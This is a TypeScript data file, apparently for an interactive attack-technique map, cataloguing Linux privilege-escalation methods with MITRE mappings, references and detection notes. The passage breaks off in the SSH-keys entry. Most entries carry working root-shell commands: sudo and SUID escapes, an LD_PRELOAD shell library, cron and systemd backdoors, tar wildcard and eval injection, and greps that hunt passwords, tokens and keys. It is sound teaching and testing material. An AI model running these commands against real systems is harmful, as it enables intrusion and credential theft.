import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { cat, mitre, r } from '../lib';

/** A category groups related techniques; clicking it expands the lane rather than
 *  opening a detail panel. Mirrors the cat() idiom in ad-categories.ts. */

/**
 * Linux privilege escalation — seven abuse lanes from an unprivileged shell to root.
 *
 * lin-enum (the triage hub, in linux-onramp) fans into these categories; every
 * technique converges on lin-root. The taxonomy is primitive-aligned, ordered by the
 * usual quick-wins-first workflow:
 *
 *   Sudo Abuse                     -> sudoers misconfig, env injection, sudo CVEs
 *   SUID / SGID & Capabilities     -> setuid binaries, library/PATH hijack, capabilities
 *   Scheduled Jobs & Services      -> writable cron / systemd / scripts, logrotate
 *   Credentials & Secrets          -> stored secrets, SSH keys, DB creds, reuse, session hijack
 *   Writable Files & Shares        -> /etc/passwd, /etc/shadow, write primitives, NFS
 *   Privileged Groups & Containers -> dangerous groups, docker/lxd, container escape
 *   Kernel & Library Exploits      -> kernel/glibc/polkit CVEs, service CVEs, recent named LPEs
 *
 * Named CVEs cite a live primary source (NVD, vendor, or the discovering researcher).
 * The most recent named LPEs are listed for AWARENESS ONLY, with no exploitation detail,
 * matching how the recent Windows CVEs (RedSun / BlueHammer) are handled on the PE map.
 */
export const linuxPrivescNodes: TechniqueNodeDef[] = [
  // ── Lane categories ────────────────────────────────────────────────────────
  cat('lin-cat-sudo', 'Sudo Abuse', 'sudo', 'Turn a sudo right or a sudo bug into a root shell.', 'The most common Linux privesc. sudo -l reveals commands you may run as root and the environment variables sudo preserves (env_keep in the matching Defaults); sudo -V shows the version, which you compare against known-vulnerable ranges. A permissive rule, a shell-spawning binary, LD_PRELOAD, argument injection, or a sudo CVE each gets you a root shell.'),
  cat('lin-cat-suid', 'SUID / SGID & Capabilities', 'suid', 'Abuse a binary that runs with elevated privilege regardless of the caller.', 'setuid/setgid binaries and file capabilities let a program keep root (or another owner) power no matter who launches it. Abuse a known shell escape, hijack a library or a relatively-named command it loads, use a dangerous capability, or reverse a custom binary for a flaw.'),
  cat('lin-cat-jobs', 'Scheduled Jobs & Services', 'jobs', 'Hijack something root runs on a schedule or on demand.', 'Cron, systemd timers, logrotate, and root-run scripts execute as root on a schedule or event. If you can write the job, its target script, a directory it uses, or influence a wildcard it expands, your code runs as root the next time it fires.'),
  cat('lin-cat-creds', 'Credentials & Secrets', 'creds', 'Find or capture a credential that unlocks root or another user.', 'Operators leave secrets everywhere: config files, histories, git repos, databases, SSH keys, and live process memory. Recover one, reuse a password, crack a hash, or hijack a privileged terminal session or process to become root or a higher-privileged user.'),
  cat('lin-cat-files', 'Writable Files & Shares', 'files', 'Abuse a write to a sensitive system file or an unsquashed share.', 'When the wrong file or share is writable, root follows directly: add an account to /etc/passwd, crack or replace a hash in /etc/shadow, turn an arbitrary-write primitive into authorized_keys or a cron job, or plant a setuid binary on an NFS export mounted no_root_squash.'),
  cat('lin-cat-containers', 'Privileged Groups & Containers', 'containers', 'Escape a container or ride a root-equivalent group to the host.', 'Some group memberships (docker, lxd, disk) are root by another name, and a mis-scoped container is a shell away from the host. Drive the Docker daemon, spin an LXD image, or exploit an over-permissioned or vulnerable runtime to break out to the underlying host.'),
  cat('lin-cat-kernel', 'Kernel & Library Exploits', 'kernel', 'Exploit a bug in the kernel, a core library, or a versioned service.', 'When the configuration is clean, a code bug still works. Match the exact kernel, glibc, polkit, or service version to a public exploit: Dirty Pipe, GameOver(lay), nf_tables, Looney Tunables, PwnKit and their kin turn an unprivileged shell into root on an unpatched host.'),

  // ── Lane 1: Sudo Abuse ───────────────────────────────────────────────────────
  {
    id: 'lin-sudo-gtfobins',
    label: 'Sudo Rule / GTFOBins',
    phase: 'sudo',
    summary: 'sudo -l shows ALL, a shell, or a binary with a documented shell escape.',
    description:
      'Read your sudo entitlements with sudo -l. An unrestricted rule (ALL) or a permitted shell hands you root immediately. Otherwise, most allowed binaries can be steered into spawning a shell, reading a file, or writing one as root: GTFOBins catalogs the exact escape for each (a pager that shells out, an editor, an interpreter, tar/find with an exec option). NOPASSWD rules mean no credential is even needed.',
    requires: ['A sudoers rule granting you one or more commands as root (with or without NOPASSWD)'],
    commands: [
      { label: 'List your sudo rights', code: r`sudo -l`, lang: 'bash' },
      { label: 'Unrestricted rule or a shell', code: r`sudo su -        # or: sudo /bin/bash`, lang: 'bash' },
      { label: 'Shell escape via an allowed binary (GTFOBins)', code: r`sudo find . -exec /bin/sh \; -quit
sudo less /etc/profile   # then: !/bin/sh
sudo awk 'BEGIN{system("/bin/sh")}'`, lang: 'bash' },
    ],
    tools: [{ name: 'GTFOBins', url: 'https://gtfobins.github.io/' }],
    mitre: mitre('T1548.003'),
    references: [
      { label: 'MITRE ATT&CK, Sudo and Sudo Caching (T1548.003)', url: 'https://attack.mitre.org/techniques/T1548/003/' },
      { label: 'GTFOBins, Sudo', url: 'https://gtfobins.github.io/#+sudo' },
    ],
    opsec: 'sudo invocations are logged to the auth log / journal with the exact command; a shell escape from an odd binary stands out in review. sudo -l is itself logged to syslog/auth.log by default via the sudoers plugin (COMMAND=list), with no auditd required; auditd only adds a separate, harder-to-tamper record.',
  },
  {
    id: 'lin-sudo-env',
    label: 'Environment Injection (LD_PRELOAD)',
    phase: 'sudo',
    summary: 'A sudo rule preserves the environment; steer the loader to run your code as root.',
    description:
      'When a sudoers rule keeps environment variables (env_keep with LD_PRELOAD or LD_LIBRARY_PATH, or env_reset disabled), you control how the elevated command loads code. Point LD_PRELOAD at a small shared object whose constructor spawns a root shell, or point LD_LIBRARY_PATH at a directory holding a malicious copy of a library the command needs. The binary runs as root and loads your library first.',
    requires: ['A sudo rule that preserves LD_PRELOAD / LD_LIBRARY_PATH (env_keep) or does not reset the environment'],
    commands: [
      { label: 'Confirm the env is preserved', code: r`sudo -l    # look for env_keep+=LD_PRELOAD or missing env_reset`, lang: 'bash' },
      { label: 'Build a preload shell', code: r`cat > /tmp/x.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){setuid(0);system("/bin/bash");}
EOF
gcc -shared -fPIC -nostartfiles /tmp/x.c -o /tmp/x.so`, lang: 'bash' },
      { label: 'Trigger via the allowed sudo command', code: r`sudo LD_PRELOAD=/tmp/x.so <allowed-command>`, lang: 'bash' },
    ],
    mitre: mitre('T1574.006'),
    references: [
      { label: 'MITRE ATT&CK, Dynamic Linker Hijacking (T1574.006)', url: 'https://attack.mitre.org/techniques/T1574/006/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (LD_PRELOAD)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'The sudo command is still logged; the preload library on disk is the artifact. glibc ignores LD_PRELOAD for plain setuid binaries, so this depends on the sudoers env policy, not on the target being setuid.',
  },
  {
    id: 'lin-sudo-argwild',
    label: 'Argument & Wildcard Injection',
    phase: 'sudo',
    summary: 'A rule looks constrained but a binary flag, wrapper, or wildcard breaks out.',
    description:
      'A sudo rule that pins a specific binary or wrapper often still lets you smuggle in behaviour. Many tools have a flag that shells out or writes arbitrary files (an editor invoked from a --exec, a checkpoint action, a config-file override). sudoedit and wrappers that pass your arguments to another program are classic footguns. Where a rule allows a command with a wildcard, extra crafted filenames become option arguments.',
    requires: ['A sudo rule pinning a binary/wrapper that accepts an argument or wildcard you can influence'],
    commands: [
      { label: 'Break out via a tool flag (GTFOBins)', code: r`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo git help config    # then type: !/bin/sh   (opens the man pager / less)`, lang: 'bash' },
      { label: 'Inject options through a wildcard', code: r`# rule: (root) /usr/bin/somejob *  -> plant files whose names are flags
touch -- '--some-dangerous-flag'`, lang: 'bash' },
    ],
    tools: [{ name: 'GTFOBins', url: 'https://gtfobins.org/' }],
    mitre: mitre('T1548.003'),
    references: [
      { label: 'MITRE ATT&CK, Sudo and Sudo Caching (T1548.003)', url: 'https://attack.mitre.org/techniques/T1548/003/' },
      { label: 'GTFOBins', url: 'https://gtfobins.org/' },
    ],
    opsec: 'The elevated command and its arguments are logged, so an injected flag or a shell-out is visible to anyone reviewing sudo logs.',
  },
  {
    id: 'lin-sudo-cve',
    label: 'Sudo CVEs',
    phase: 'sudo',
    summary: 'Exploit a flaw in sudo itself: Baron Samedit, Runas bypass, sudoedit, host/chroot.',
    description:
      'Check sudo -V against the known-vulnerable ranges. Baron Samedit (CVE-2021-3156) is a heap overflow reachable by any local user with no sudo rights at all. CVE-2019-14287 bypasses a Runas rule written as (ALL, !root) by passing user -1. CVE-2023-22809 abuses sudoedit EDITOR handling to edit arbitrary files. The 2025 pair widens reach: CVE-2025-32462 (the -h/--host option leaking into execution) and CVE-2025-32463 (the --chroot option loading an attacker /etc/nsswitch.conf); CVE-2025-32463 is in the CISA KEV catalog (confirmed actively exploited), CVE-2025-32462 is not.',
    requires: ['A locally installed sudo version within a vulnerable range (some, like Baron Samedit, need no sudo rule)'],
    commands: [
      { label: 'Check the version first', code: r`sudo -V | head -1`, lang: 'bash' },
      { label: 'Runas bypass (CVE-2019-14287)', code: r`sudo -u#-1 vi     # rule Runas is (ALL,!root); run a command the rule permits (its command field must be ALL or list that binary)`, lang: 'bash' },
      { label: 'Probe Baron Samedit (CVE-2021-3156)', code: r`sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # a crash implies vulnerable`, lang: 'bash' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'Qualys, Baron Samedit (CVE-2021-3156)', url: 'https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit' },
      { label: 'NVD, CVE-2019-14287 (Runas bypass)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2019-14287' },
      { label: 'sudo.ws advisory, CVE-2019-14287 (Runas user restriction bypass)', url: 'https://www.sudo.ws/security/advisories/minus_1_uid/' },
      { label: 'sudo.ws advisory, CVE-2023-22809 (sudoedit arbitrary file edit)', url: 'https://www.sudo.ws/security/advisories/sudoedit_any/' },
      { label: 'Stratascale, CVE-2025-32462 (sudo host option)', url: 'https://www.stratascale.com/resource/cve-2025-32462-sudo-host-option-vulnerability/' },
      { label: 'NVD, CVE-2025-32463 (sudo chroot)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2025-32463' },
      { label: 'sudo.ws advisory, CVE-2025-32463 (LPE via chroot option)', url: 'https://www.sudo.ws/security/advisories/chroot_bug/' },
    ],
    opsec: 'A failed exploit can crash sudo (logged) or leave core dumps. Confirm the version before firing; a memory-corruption PoC against a patched build is noisy and pointless.',
  },

  // ── Lane 2: SUID / SGID & Capabilities ─────────────────────────────────────────
  {
    id: 'lin-suid-gtfobins',
    label: 'SUID / SGID GTFOBins',
    phase: 'suid',
    summary: 'A setuid-root binary has a documented way to spawn a shell or read/write as root.',
    description:
      'Enumerate every setuid/setgid file, then check each against GTFOBins. A binary carrying the setuid bit and owned by root runs with root effective UID for anyone; if that binary is a shell-spawner, pager, editor, or a tool with an exec/read/write primitive, you inherit root. Some need a small setuid(0) call first because the binary drops privileges, which GTFOBins notes per entry.',
    requires: ['A setuid/setgid root binary with a known GTFOBins escape (or a shell-out primitive)'],
    commands: [
      { label: 'Find SUID/SGID binaries', code: r`find / -type f -a \( -perm -u+s -o -perm -g+s \) -ls 2>/dev/null`, lang: 'bash' },
      { label: 'Escape a SUID binary (GTFOBins examples)', code: r`# e.g. find / bash / env are common:
./find . -exec /bin/sh -p \; -quit
/bin/bash -p
env /bin/sh -p
# -p is needed only where the shell drops SUID by default; omit it where the shell does not
# drop it (e.g. /bin/sh is dash on Debian/Ubuntu), or the escape silently fails`, lang: 'bash' },
    ],
    tools: [{ name: 'GTFOBins', url: 'https://gtfobins.github.io/' }],
    mitre: mitre('T1548.001'),
    references: [
      { label: 'MITRE ATT&CK, Setuid and Setgid (T1548.001)', url: 'https://attack.mitre.org/techniques/T1548/001/' },
      { label: 'GTFOBins, SUID', url: 'https://gtfobins.github.io/#+suid' },
    ],
    opsec: 'Running a stock SUID binary is normal; a shell spawned from one with the -p (preserve privileges) flag, or an unexpected child process, is the tell in process telemetry.',
  },
  {
    id: 'lin-suid-library',
    label: 'Shared-Object / Library Injection',
    phase: 'suid',
    summary: 'A privileged binary loads a library or module from a path or name you control.',
    description:
      'A setuid or root-run program resolves shared objects at runtime. If it dlopen()s a library from a writable directory, honours an unsanitised RUNPATH, or an interpreter it runs imports a module from a writable path (a writable entry on Python sys.path, a PERL5LIB, a writable .so it expects), plant a malicious library whose constructor runs your code as root. Run ltrace/strace to see which files it tries to open and where.',
    requires: ['A privileged binary that loads a shared object or interpreter module from a writable or attacker-influenced path'],
    commands: [
      { label: 'See what libraries it opens', code: r`strace -f -e openat ./target 2>&1 | grep -i '\.so'
ltrace ./target 2>&1 | head`, lang: 'bash' },
      { label: 'Plant a constructor .so at the expected path', code: r`cat > x.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void init(){setuid(0);setgid(0);system("/bin/bash -p");}
EOF
gcc -shared -fPIC -o /path/it/loads/lib.so x.c`, lang: 'bash' },
      { label: 'Python module hijack', code: r`# writable dir earlier on sys.path than the real module:
echo 'import os;os.setuid(0);os.system("/bin/bash")' > /writable/on/path/<module>.py`, lang: 'bash' },
    ],
    mitre: mitre('T1574.006'),
    references: [
      { label: 'MITRE ATT&CK, Dynamic Linker Hijacking (T1574.006)', url: 'https://attack.mitre.org/techniques/T1574/006/' },
      { label: 'NVD, CVE-2022-41347 (example: library load hijack)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-41347' },
      { label: 'Darren Martyn, Zimbra nginx Local Root Exploit (CVE-2022-41347)', url: 'https://darrenmartynie.wordpress.com/2021/10/25/zimbra-nginx-local-root-exploit/' },
    ],
    opsec: 'The planted library or module is the on-disk artifact and integrity-monitoring will flag a new .so/.py in a system path. Note on tracing: the kernel drops the setuid bit when you ptrace a setuid binary as non-root, so it runs with your privileges and its privileged library-resolution paths can differ from the real run. Prefer static inspection (ldd, readelf -d, strings) or trace as root; ptrace_scope may block the attach outright.',
  },
  {
    id: 'lin-suid-path',
    label: 'PATH Hijacking',
    phase: 'suid',
    summary: 'A privileged binary calls a helper by relative name; front-run it via $PATH.',
    description:
      'A setuid binary, or a script run as root via sudo or cron, invokes another command without an absolute path (service, cat, ps). The privileged process searches $PATH to resolve it. Prepend a directory you control to $PATH and drop an executable with the helper name, or, where the caller has its own fixed PATH, write into whichever directory on that PATH is writable. Your stand-in runs with the caller privilege.',
    requires: ['A root-run binary/script that calls a command by relative name, and control of a directory that resolves first on its PATH'],
    commands: [
      { label: 'Spot a relative call in a SUID binary', code: r`strings ./suidbin | grep -E '^[a-zA-Z0-9_.-]+$'   # candidate command names (noisy; cross-check against the observed exec)
ltrace ./suidbin 2>&1 | grep -i exec`, lang: 'bash' },
      { label: 'Front-run it', code: r`echo '/bin/bash -p' > /tmp/service && chmod +x /tmp/service
export PATH=/tmp:$PATH
./suidbin`, lang: 'bash' },
    ],
    mitre: mitre('T1574.007'),
    references: [
      { label: 'MITRE ATT&CK, Path Interception by PATH Environment Variable (T1574.007)', url: 'https://attack.mitre.org/techniques/T1574/007/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (PATH)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'Modifying PATH is per-session and quiet, but the stand-in binary in /tmp and the anomalous child of a system binary are visible in process auditing.',
  },
  {
    id: 'lin-caps',
    label: 'Linux Capabilities',
    phase: 'suid',
    summary: 'A binary carries a capability (cap_setuid, cap_dac_override, ...) that yields root.',
    description:
      'File capabilities split root into discrete powers attached to a binary, and several are root-equivalent. cap_setuid+ep on an interpreter lets it call setuid(0) and drop a root shell. cap_dac_override reads or writes any file (edit /etc/shadow). cap_sys_admin, cap_sys_ptrace, and cap_sys_module are similarly decisive. Enumerate with getcap and match the capability to its abuse.',
    requires: ['A binary with a dangerous capability set (cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace, cap_sys_module)'],
    commands: [
      { label: 'Find capabilities', code: r`getcap -r / 2>/dev/null`, lang: 'bash' },
      { label: 'Abuse cap_setuid on an interpreter', code: r`# e.g. python with cap_setuid+ep:
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'`, lang: 'bash' },
      { label: 'Abuse cap_dac_override to read shadow', code: r`# a binary with cap_dac_override can open any file regardless of perms`, lang: 'bash' },
    ],
    tools: [{ name: 'GTFOBins, Capabilities', url: 'https://gtfobins.org/#//^capabilities$' }],
    mitre: mitre('T1548'),
    references: [
      { label: 'MITRE ATT&CK, Abuse Elevation Control Mechanism (T1548)', url: 'https://attack.mitre.org/techniques/T1548/' },
      { label: 'GTFOBins, Capabilities', url: 'https://gtfobins.org/#//^capabilities$' },
    ],
    opsec: 'Using a capability is indistinguishable from legitimate use of the binary; the child shell it spawns as root is the signal. Capabilities set on non-standard binaries are themselves a red flag in a config audit.',
  },
  {
    id: 'lin-suid-custom',
    label: 'Custom Binary Analysis',
    phase: 'suid',
    summary: 'Reverse a bespoke root binary for a flaw: injection, TOCTOU, deserialization.',
    description:
      'A custom root-owned program (a setuid binary, a sudo/cron-invoked helper, a deployed JAR) is not in GTFOBins, so read it for the flaw. strings and a disassembler reveal a shelled-out command you can inject, a relative path you can hijack, or an insecure temp file. A privileged process that operates on a path it does not exclusively own is a symlink TOCTOU; one that deserializes attacker-influenced data (a sudo-run wrapper, an exposed port) is a code-execution primitive.',
    requires: ['A custom root-owned binary/script you can read or trigger, containing an injectable command, a TOCTOU window, or an unsafe deserialization'],
    commands: [
      { label: 'Triage the binary', code: r`file ./bin; strings -n8 ./bin | less
# unpack a packaged artifact if needed:
python pyinstxtractor.py ./bin   # PyInstaller (or: pyinstxtractor-ng ./bin); then decompile the .pyc`, lang: 'bash' },
      { label: 'Win a symlink race (TOCTOU)', code: r`while :; do ln -sf /etc/passwd /tmp/predictable 2>/dev/null; done &`, lang: 'bash' },
    ],
    tools: [
      { name: 'Ghidra', url: 'https://github.com/NationalSecurityAgency/ghidra' },
      { name: 'pwntools', url: 'https://github.com/Gallopsled/pwntools' },
      { name: 'pyinstxtractor', url: 'https://github.com/extremecoders-re/pyinstxtractor' },
    ],
    mitre: mitre('T1068'),
    references: [
      { label: 'MITRE ATT&CK, Exploitation for Privilege Escalation (T1068)', url: 'https://attack.mitre.org/techniques/T1068/' },
      { label: 'MITRE, CWE-367: TOCTOU Race Condition', url: 'https://cwe.mitre.org/data/definitions/367.html' },
    ],
    opsec: 'Reversing is offline and silent. The exploitation step (a tight race loop, a spawned shell, a temp-file swap) is where process and file auditing can catch you.',
  },

  // ── Lane 3: Scheduled Jobs & Services ──────────────────────────────────────────
  {
    id: 'lin-cron-writable',
    label: 'Writable Cron Job',
    phase: 'jobs',
    summary: 'A root cron job, its script, or a directory it uses is writable by you.',
    description:
      'Cron and systemd timers run jobs as their owner, usually root. Enumerate /etc/crontab, /etc/cron.*, and per-user crontabs, and watch with pspy to catch jobs not listed in a file. If the invoked script is writable, append a reverse shell or a setuid copy of bash; if only the directory is writable, drop a file the job globs in; if the job calls a command by relative name, that is a PATH hijack. Your payload runs as root on the next tick.',
    requires: ['A cron job or systemd timer that runs as root and executes a file or directory you can write'],
    commands: [
      { label: 'Enumerate scheduled jobs', code: r`cat /etc/crontab; ls -la /etc/cron.*; crontab -l
systemctl list-timers --all`, lang: 'bash' },
      { label: 'Catch unlisted jobs live', code: r`./pspy64`, lang: 'bash' },
      { label: 'Backdoor a writable job script', code: r`echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/job.sh
# after it fires:
/tmp/rootbash -p`, lang: 'bash' },
    ],
    tools: [{ name: 'pspy', url: 'https://github.com/DominicBreuker/pspy' }],
    mitre: mitre('T1053.003'),
    references: [
      { label: 'MITRE ATT&CK, Scheduled Task/Job: Cron (T1053.003)', url: 'https://attack.mitre.org/techniques/T1053/003/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (cron)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'The modified script and a setuid /tmp/rootbash are on-disk artifacts. pspy is quiet (it watches /proc via inotify and scans it, no root or ptrace needed), but the payload firing as root is logged by cron and auditd.',
  },
  {
    id: 'lin-cron-wildcard',
    label: 'Cron Wildcard Injection',
    phase: 'jobs',
    summary: 'A root job runs a command with an unquoted * over a directory you can write.',
    description:
      'A privileged job that runs tar, rsync, chown, or 7z with an unquoted wildcard over a directory you control lets you smuggle in command-line options as filenames. tar honours --checkpoint-action, rsync honours -e, and each becomes an argument when the shell expands *. Drop files whose names are those flags plus a script, and tar/rsync/7z execute your code as root when the job expands the wildcard; chown/chmod instead take a --reference file, letting you change ownership or permissions of an arbitrary file (an indirect path to root, not direct code execution).',
    requires: ['A root cron/job running a wildcard command (tar/rsync/chown/7z) over a directory you can write'],
    commands: [
      { label: 'tar checkpoint-action injection', code: r`cd /writable/dir/the/job/globs
echo '#!/bin/sh' > sh.sh; echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> sh.sh; chmod +x sh.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh sh.sh'
# after the job fires, run the setuid bash with -p or it drops back to your UID and is NOT root:
/tmp/rb -p`, lang: 'bash' },
    ],
    mitre: mitre('T1053.003'),
    references: [
      { label: 'MITRE ATT&CK, Scheduled Task/Job: Cron (T1053.003)', url: 'https://attack.mitre.org/techniques/T1053/003/' },
      { label: 'GTFOBins, tar', url: 'https://gtfobins.github.io/gtfobins/tar/' },
    ],
    opsec: 'The flag-named files are visible to anyone who lists the directory, and the spawned action is logged when the job runs. Clean up the crafted filenames after the job fires. If /tmp is mounted nosuid (common on hardened hosts), the /tmp/rb setuid trick is inert; have the action drop the setuid binary somewhere exec+suid-capable (/var/tmp or the user home) or just run a reverse shell / add a key from the action instead.',
  },
  {
    id: 'lin-systemd',
    label: 'Writable systemd Unit / Timer',
    phase: 'jobs',
    summary: 'A writable unit file, or its ExecStart target, runs your command as root.',
    description:
      'Services run as root through systemd units. If a unit file, a drop-in it includes, or the binary/script named in ExecStart is writable, set ExecStart to your payload (or edit the target) and start or wait for the service. A writable timer that triggers such a unit is the scheduled variant. Relative-path or writable-PATH ExecStart lines are the same class of bug as cron PATH hijacking.',
    requires: ['A writable systemd unit/timer, drop-in, or ExecStart target for a service that runs as root'],
    commands: [
      { label: 'Find writable units', code: r`find /etc/systemd /lib/systemd /usr/lib/systemd /usr/local/lib/systemd /run/systemd -writable -name '*.service' 2>/dev/null
systemctl list-units --type=service`, lang: 'bash' },
      { label: 'Point ExecStart at a payload, then run it', code: r`# in a writable .service:
# ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
systemctl daemon-reload && systemctl start <unit>   # if allowed`, lang: 'bash' },
    ],
    mitre: mitre('T1543.002'),
    references: [
      { label: 'MITRE ATT&CK, Systemd Service (T1543.002), the service path', url: 'https://attack.mitre.org/techniques/T1543/002/' },
      { label: 'MITRE ATT&CK, Scheduled Task/Job: Systemd Timers (T1053.006), the timer path', url: 'https://attack.mitre.org/techniques/T1053/006/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (systemd)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'Editing a unit and daemon-reload are logged by the journal; a service whose ExecStart changed is an obvious integrity event. Restarting a system service may disrupt it and draw attention.',
  },
  {
    id: 'lin-writable-script',
    label: 'Writable Root-Run Script',
    phase: 'jobs',
    summary: 'A script root runs (login/MOTD, app hook, NOPASSWD wrapper) is writable or injectable.',
    description:
      'Beyond cron and systemd, plenty of root-run scripts are editable or take unsanitised input: MOTD/update-motd hooks, profile scripts, application maintenance actions, a NOPASSWD wrapper. If the script itself is writable, backdoor it. If it builds a shell command from data you influence (a filename, an env var, a field in a file it parses), inject a command so it executes as root when the script runs.',
    requires: ['A root-run script that is writable, or that builds a shell command from input you control'],
    commands: [
      { label: 'Find writable scripts (as current user)', code: r`find / -type f -writable \( -name '*.sh' -o -path '*update-motd*' \) 2>/dev/null | grep -vE '^/(proc|sys)'`, lang: 'bash' },
      { label: 'Command injection via a controlled field', code: r`# if a root script does: eval "echo $NAME"  or parses your filename unsafely
export NAME='x; cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
# after it fires, run the setuid bash with -p or it drops privileges and is NOT root:
/tmp/rb -p`, lang: 'bash' },
    ],
    mitre: mitre('T1059'),
    references: [
      { label: 'MITRE ATT&CK, Command and Scripting Interpreter (T1059)', url: 'https://attack.mitre.org/techniques/T1059/' },
      { label: 'MITRE, CWE-78: OS Command Injection', url: 'https://cwe.mitre.org/data/definitions/78.html' },
    ],
    opsec: 'A modified system script is a clear integrity signal, and the injected command runs under root in the process tree. Prefer the least conspicuous payload (a setuid drop over a callback) on monitored hosts.',
  },
  {
    id: 'lin-logrotate',
    label: 'Logrotate (logrotten)',
    phase: 'jobs',
    summary: 'A root-run logrotate with create/compress, raced via a directory swap, into an arbitrary root write.',
    description:
      'logrotate runs as root and, when configured with the create or compress directive over a log directory you can rename, can be raced so that the file it re-creates lands in an attacker-chosen directory with attacker-controlled content. After logrotate renames the old log, the logrotten technique swaps the log directory for a symlink pointing at a target directory (e.g. /etc/bash_completion.d/), so the newly created file is written there, giving an arbitrary root-owned file write that drops a cron job or a setuid binary. The gating capability is directory-rename control plus the create/compress directive, not merely a writable log.',
    requires: ['A log directory you can rename that root-run logrotate processes with the create/compress directive, plus control of rotation timing, on a vulnerable version/config'],
    affects: 'logrotten targets logrotate versions the author tested vulnerable: 3.8.6, 3.11.0, 3.15.0, and 3.18.0. Confirm the installed version and config before attempting.',
    commands: [
      { label: 'Identify what logrotate touches', code: r`cat /etc/logrotate.conf; ls -la /etc/logrotate.d/
ls -la <the writable log being rotated>`, lang: 'bash' },
      { label: 'Race the rotation (logrotten)', code: r`# create directive: payload written to a root-owned path
./logrotten -p ./payload <writable-log>
# compress directive: needs -c and a delay (-s <sec>) for the post-rotation compress step
./logrotten -c -s 4 -p ./payload <writable-log>`, lang: 'bash' },
    ],
    tools: [{ name: 'logrotten (PoC)', url: 'https://github.com/whotwagner/logrotten' }],
    mitre: mitre('T1068'),
    references: [
      { label: 'MITRE ATT&CK, Exploitation for Privilege Escalation (T1068)', url: 'https://attack.mitre.org/techniques/T1068/' },
      { label: 'logrotten (whotwagner), rotation-race PoC + writeup', url: 'https://github.com/whotwagner/logrotten' },
    ],
    opsec: 'logrotten blocks on inotify waiting for the rename rather than spinning, so the tells are the transient directory rename/symlink and the anomalous root-owned file appearing in a system dir (integrity monitoring can flag it), not sustained CPU. Confirm the logrotate version/options before attempting, since it is config-dependent.',
  },

  // ── Lane 4: Credentials & Secrets ──────────────────────────────────────────────
  {
    id: 'lin-cred-hunt',
    label: 'Hunt Stored Credentials',
    phase: 'creds',
    summary: 'Grep configs, histories, git repos, and memory for reusable secrets.',
    description:
      'Credentials leak into files everywhere. Grep application directories, dotfiles, backups, and web roots for password/secret patterns; read shell histories and env; mine readable .git repositories for secrets committed and later deleted; and check process arguments and a target process memory (via /proc/<pid>/mem, given ptrace access) for cleartext. A single recovered password often unlocks root through su or a sudo rule, or another user with more access.',
    requires: ['Read access to files, histories, git history, or process memory holding a reusable secret'],
    commands: [
      { label: 'Grep for secrets', code: r`grep -rniIE 'password|passwd|secret|api[_-]?key|token' /etc /opt /var/www /home 2>/dev/null | head
cat ~/.bash_history ~/.*_history 2>/dev/null`, lang: 'bash' },
      { label: 'Mine a git repo history', code: r`git -C /path/to/repo log -p | grep -iE 'password|secret|key'`, lang: 'bash' },
      { label: 'Cleartext in process args / memory', code: r`ps aux | grep -iE 'pass|token'
# read a process's memory (needs ptrace access to that PID; gcore <pid> also works):
cat /proc/<pid>/maps; strings /proc/<pid>/mem 2>/dev/null | grep -i pass | head`, lang: 'bash' },
    ],
    mitre: mitre('T1552.001'),
    references: [
      { label: 'MITRE ATT&CK, Credentials In Files (T1552.001)', url: 'https://attack.mitre.org/techniques/T1552/001/' },
      { label: 'InternalAllTheThings, Linux Privilege Escalation (interesting files)', url: 'https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/linux-privilege-escalation/' },
    ],
    opsec: 'Recursive greps across the filesystem are I/O-heavy and slow; they are only logged if the host runs file/read audit rules (auditd read watches, EDR, or fanotify), which are not the default, so scope to likely directories first. Reading another process memory via /proc/<pid>/mem needs ptrace access (gated by kernel.yama.ptrace_scope) and is itself suspicious.',
  },
  {
    id: 'lin-ssh-keys',
    label: 'SSH Keys & Trust',
    phase: 'creds',
    summary: 'Recover a private key, abuse an SSH CA, or write an authorized_keys entry.',
    description:
      'SSH offers several trust paths beyond a password. Hunt for readable private keys (id_rsa/ed25519) in home directories, backups, and world-readable locations, and reuse a passphrase you already cracked. Where an SSH certificate authority signs user certs, a leaked CA key lets you mint a cert for any principal the server\'s CA config accepts (bounded by TrustedUserCAKeys and its AuthorizedPrincipalsFile / principals mapping). And any write into a target user root can drop an authorized_keys entry for a login as them.',
    requires: ['A readable SSH private key, a leaked SSH CA signing key, or write access to a target authorized_keys'],
    commands: [
      { label: 'Find private keys', code: r`find / -name 'id_*' -o -name 'authorized_keys' 2>/dev/null
grep -rl 'PRIVATE KEY' /home /root /var 2>/dev/null`, lang: 'bash' },
      { label: 'Crack a key passphrase', code: r`ssh2john id_rsa > h; john --wordlist=rockyou.txt h`, lang: 'bash' },
